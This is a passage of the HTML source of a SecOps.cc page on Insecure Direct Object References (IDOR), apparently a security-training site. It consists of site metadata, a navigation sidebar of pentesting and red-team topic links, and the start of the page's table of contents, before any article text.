<!doctype html><html lang=en class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="SecOps.cc is an information security platform designed to cover various offensive & defensive security topics"><meta name=author content=dh><link href=https://secops.cc/attacking_web_applications/idor/ rel=canonical><link rel=icon href=../../assets/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.1.4"><title>Insecure Direct Object References - SecOps.cc</title><link rel=stylesheet href=../../assets/stylesheets/main.bb3983ee.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo> <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)</script> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#insecure-direct-object-references-idor class=md-skip> Skip to content </a> </div> <div data-md-component=announce> </div> <header class=md-header data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=../.. title=SecOps.cc class="md-header__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> SecOps.cc </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Insecure Direct Object References </span> </div> </div> </div> <form class=md-header__option data-md-component=palette> <input class=md-option data-md-color-media data-md-color-scheme=default data-md-color-primary=indigo data-md-color-accent=indigo aria-label="Switch to dark mode" type=radio name=__palette id=__palette_1> <label class="md-header__button md-icon" title="Switch to dark mode" for=__palette_2 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3z"/></svg> </label> <input class=md-option data-md-color-media data-md-color-scheme=slate data-md-color-primary=red data-md-color-accent=red aria-label="Switch to light mode" type=radio name=__palette id=__palette_2> <label class="md-header__button md-icon" title="Switch to light mode" for=__palette_1 hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg> </label> </form> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=Search placeholder=Search autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> Initializing search </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> </nav> </header> <div class=md-container data-md-component=container> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> Home </a> </li> <li class=md-tabs__item> <a href=../../changelog/ class="md-tabs__link md-tabs__link--active"> Docs </a> </li> <li class=md-tabs__item> <a href=../../blog/ class=md-tabs__link> Blog </a> </li> </ul> </div> </nav> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=SecOps.cc class="md-nav__button md-logo" aria-label=SecOps.cc data-md-component=logo> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 89 89"> <path d=M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z /> <path d=M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z style="fill-opacity: 0.5"/> <path d=M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z /> <path d=M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z style="fill-opacity: 0.25"/> </svg> </a> SecOps.cc </label> <div class=md-nav__source> <a href=https://github.com/hrmnsio/SecOps title="Go to repository" class=md-source data-md-component=source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg> </div> <div class=md-source__repository> hrmnsio/SecOps </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> Home </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2 checked> <div class="md-nav__link md-nav__link--index "> <a href=../../changelog/ >Docs</a> <label for=__nav_2> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Docs data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> Docs </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2 type=checkbox id=__nav_2_2> <label class=md-nav__link for=__nav_2_2> Cheatsheets <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Cheatsheets data-md-level=2> <label class=md-nav__title for=__nav_2_2> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_2_1 type=checkbox id=__nav_2_2_1> <label class=md-nav__link for=__nav_2_2_1> Pentesting/CTF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pentesting/CTF data-md-level=3> <label class=md-nav__title for=__nav_2_2_1> <span class="md-nav__icon md-icon"></span> Pentesting/CTF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../cheat_sheets/cheatsheet-77/ class=md-nav__link> Commands </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/linux_shortcuts/ class=md-nav__link> Linux Shortcuts </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/windows/ class=md-nav__link> Windows </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/shells_payloads/ class=md-nav__link> Shells & Payloads </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_requests/ class=md-nav__link> Web requests </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/deobfuscation/ class=md-nav__link> (De)Obfuscation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/brute_forcing/ class=md-nav__link> Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/common_apps/ class=md-nav__link> Common Applications </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/web_attacks/ class=md-nav__link> Web Attacks </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/file_transfer/ class=md-nav__link> File Transfer </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/win_privesc/ class=md-nav__link> Windows Privilege Escalation </a> </li> <li class=md-nav__item> <a href=../../cheat_sheets/footprinting/ class=md-nav__link> Footprinting </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3 type=checkbox id=__nav_2_3 checked> <label class=md-nav__link for=__nav_2_3> Red Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Red Team" data-md-level=2> <label class=md-nav__title for=__nav_2_3> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1 type=checkbox id=__nav_2_3_1> <label class=md-nav__link for=__nav_2_3_1> Footprinting <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Footprinting data-md-level=3> <label class=md-nav__title for=__nav_2_3_1> <span class="md-nav__icon md-icon"></span> Footprinting </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/domain_information/ class=md-nav__link> Domain Information </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_2 type=checkbox id=__nav_2_3_1_2> <label class=md-nav__link for=__nav_2_3_1_2> Host Based Enumeration <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Host Based Enumeration" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_2> <span class="md-nav__icon md-icon"></span> Host Based Enumeration </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/smb/ class=md-nav__link> SMB </a> </li> <li class=md-nav__item> <a href=../../footprinting/nfs/ class=md-nav__link> NFS </a> </li> <li class=md-nav__item> <a href=../../footprinting/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../footprinting/smtp/ class=md-nav__link> SMTP </a> </li> <li class=md-nav__item> <a href=../../footprinting/imap_pop3/ class=md-nav__link> IMAP/POP3 </a> </li> <li class=md-nav__item> <a href=../../footprinting/snmp/ class=md-nav__link> SNMP </a> </li> <li class=md-nav__item> <a href=../../footprinting/mysql/ class=md-nav__link> MySQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/mssql/ class=md-nav__link> MSSQL </a> </li> <li class=md-nav__item> <a href=../../footprinting/ipmi/ class=md-nav__link> IPMI </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_1_3 type=checkbox id=__nav_2_3_1_3> <label class=md-nav__link for=__nav_2_3_1_3> Remote Management Protocols <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Remote Management Protocols" data-md-level=4> <label class=md-nav__title for=__nav_2_3_1_3> <span class="md-nav__icon md-icon"></span> Remote Management Protocols </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../footprinting/linux_remote_management_protocol/ class=md-nav__link> Linux </a> </li> <li class=md-nav__item> <a href=../../footprinting/windows_remote_management_protocol/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2 type=checkbox id=__nav_2_3_2> <label class=md-nav__link for=__nav_2_3_2> OS Basics <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="OS Basics" data-md-level=3> <label class=md-nav__title for=__nav_2_3_2> <span class="md-nav__icon md-icon"></span> OS Basics </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_1 type=checkbox id=__nav_2_3_2_1> <label class=md-nav__link for=__nav_2_3_2_1> Basics Linux <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Linux" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_1> <span class="md-nav__icon md-icon"></span> Basics Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_linux/linux/ class=md-nav__link> Linux </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_2_2 type=checkbox id=__nav_2_3_2_2> <label class=md-nav__link for=__nav_2_3_2_2> Basics Windows <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Basics Windows" data-md-level=4> <label class=md-nav__title for=__nav_2_3_2_2> <span class="md-nav__icon md-icon"></span> Basics Windows </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../basics_windows/windows/ class=md-nav__link> Windows </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3 type=checkbox id=__nav_2_3_3> <label class=md-nav__link for=__nav_2_3_3> Privilege Escalation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Privilege Escalation" data-md-level=3> <label class=md-nav__title for=__nav_2_3_3> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1 type=checkbox id=__nav_2_3_3_1> <label class=md-nav__link for=__nav_2_3_3_1> Windows PrivEsc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows PrivEsc" data-md-level=4> <label class=md-nav__title for=__nav_2_3_3_1> <span class="md-nav__icon md-icon"></span> Windows PrivEsc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/tools/ class=md-nav__link> Useful Tools </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_2 type=checkbox id=__nav_2_3_3_1_2> <label class=md-nav__link for=__nav_2_3_3_1_2> Getting the Lay of the Land <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Getting the Lay of the Land" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_2> <span class="md-nav__icon md-icon"></span> Getting the Lay of the Land </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/gtlotl/ class=md-nav__link> Situational Awareness </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/init_enum/ class=md-nav__link> Initial Enumeration </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/comm_with_ps/ class=md-nav__link> Communication with Processes </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_3 type=checkbox id=__nav_2_3_3_1_3> <label class=md-nav__link for=__nav_2_3_3_1_3> Windows User Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows User Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_3> <span class="md-nav__icon md-icon"></span> Windows User Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/seimpersonate_seassignprimarytoken/ class=md-nav__link> SeImpersonate and SeAssignPrimaryToken </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/sebugpriv/ class=md-nav__link> SeDebugPrivilege </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/setakeownershippriv/ class=md-nav__link> SeTakeOwnershipPrivilege </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_4 type=checkbox id=__nav_2_3_3_1_4> <label class=md-nav__link for=__nav_2_3_3_1_4> Windows Group Privileges <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Group Privileges" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_4> <span class="md-nav__icon md-icon"></span> Windows Group Privileges </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/builtin_groups/ class=md-nav__link> Windows Built-in Groups </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/eventlog_readers/ class=md-nav__link> Event Log Readers </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/dnsadmins/ class=md-nav__link> DnsAdmins </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/hyperv_admins/ class=md-nav__link> Hyper-V Administrators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/print_operators/ class=md-nav__link> Print Operators </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/server_operators/ class=md-nav__link> Server Operators </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_5 type=checkbox id=__nav_2_3_3_1_5> <label class=md-nav__link for=__nav_2_3_3_1_5> Attacking the OS <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Attacking the OS" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_5> <span class="md-nav__icon md-icon"></span> Attacking the OS </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/user_account_control/ class=md-nav__link> User Account Control </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/weak_permissions/ class=md-nav__link> Weak Permissions </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/kernel_exploits/ class=md-nav__link> Kernel Exploits </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/vulnerable_services/ class=md-nav__link> Vulnerable Services </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_6 type=checkbox id=__nav_2_3_3_1_6> <label class=md-nav__link for=__nav_2_3_3_1_6> Credential Theft <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Credential Theft" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_6> <span class="md-nav__icon md-icon"></span> Credential Theft </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/credential_hunting/ class=md-nav__link> Credential Hunting </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/other_files/ class=md-nav__link> Other Files </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/further_credential_theft/ class=md-nav__link> Further Credential Theft </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_7 type=checkbox id=__nav_2_3_3_1_7> <label class=md-nav__link for=__nav_2_3_3_1_7> Additional Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Additional Techniques" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_7> <span class="md-nav__icon md-icon"></span> Additional Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/interacting_with_users/ class=md-nav__link> Interacting with Users </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/miscellaneous_techniques/ class=md-nav__link> Miscellaneous Techniques </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_3_1_8 type=checkbox id=__nav_2_3_3_1_8> <label class=md-nav__link for=__nav_2_3_3_1_8> EOL Systems <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="EOL Systems" data-md-level=5> <label class=md-nav__title for=__nav_2_3_3_1_8> <span class="md-nav__icon md-icon"></span> EOL Systems </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../windows_privesc/windows_server/ class=md-nav__link> Windows Server </a> </li> <li class=md-nav__item> <a href=../../windows_privesc/windows_desktop/ class=md-nav__link> Windows Desktop </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_4 type=checkbox id=__nav_2_3_4> <label class=md-nav__link for=__nav_2_3_4> File Transfers <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Transfers" data-md-level=3> <label class=md-nav__title for=__nav_2_3_4> <span class="md-nav__icon md-icon"></span> File Transfers </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_transfers/methods/ class=md-nav__link> Methods </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_5 type=checkbox id=__nav_2_3_5> <label class=md-nav__link for=__nav_2_3_5> Networking <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Networking data-md-level=3> <label class=md-nav__title for=__nav_2_3_5> <span class="md-nav__icon md-icon"></span> Networking </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../networking/overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_6 type=checkbox id=__nav_2_3_6> <label class=md-nav__link for=__nav_2_3_6> Login Brute Forcing <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Login Brute Forcing" data-md-level=3> <label class=md-nav__title for=__nav_2_3_6> <span class="md-nav__icon md-icon"></span> Login Brute Forcing </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../login_brute_forcing/basic_http_auth_brute_forcing/ class=md-nav__link> Basic HTTP Auth Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/web_forms_brute_forcing/ class=md-nav__link> Web Forms Brute Forcing </a> </li> <li class=md-nav__item> <a href=../../login_brute_forcing/service_authentication/ class=md-nav__link> Service Authentication Attacks </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_7 type=checkbox id=__nav_2_3_7> <label class=md-nav__link for=__nav_2_3_7> Atk Common Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Common Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_7> <span class="md-nav__icon md-icon"></span> Atk Common Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../attacking_common_apps/setting_the_stage/ class=md-nav__link> Setting the Stage </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/content_management_systems/ class=md-nav__link> Content Management Systems </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/containers_software_dev/ class=md-nav__link> Servlet Containers/Software Development </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/infra_network_monitoring_tools/ class=md-nav__link> Infrastructure/Network Monitoring Tools </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/cs_config_mgmt/ class=md-nav__link> Customer Service Mgmt & Configuration Mgmt </a> </li> <li class=md-nav__item> <a href=../../attacking_common_apps/closing_out/ class=md-nav__link> Closing Out </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_8 type=checkbox id=__nav_2_3_8 checked> <label class=md-nav__link for=__nav_2_3_8> Atk Web Applications <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Atk Web Applications" data-md-level=3> <label class=md-nav__title for=__nav_2_3_8> <span class="md-nav__icon md-icon"></span> Atk Web Applications </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../http_verb_tampering/ class=md-nav__link> HTTP Verb Tampering </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Insecure Direct Object References <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Insecure Direct Object References </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#impact-of-idor-vulnerabilities class=md-nav__link> Impact of IDOR Vulnerabilities </a> </li> <li class=md-nav__item> <a href=#identifying-idors class=md-nav__link> Identifying IDORs </a> </li> <li class=md-nav__item> <a href=#url-parameters-apis class=md-nav__link> URL Parameters &amp; APIs </a> </li> <li class=md-nav__item> <a href=#ajax-calls class=md-nav__link> AJAX Calls </a> </li> <li class=md-nav__item> <a href=#understanding-hashingencoding class=md-nav__link> 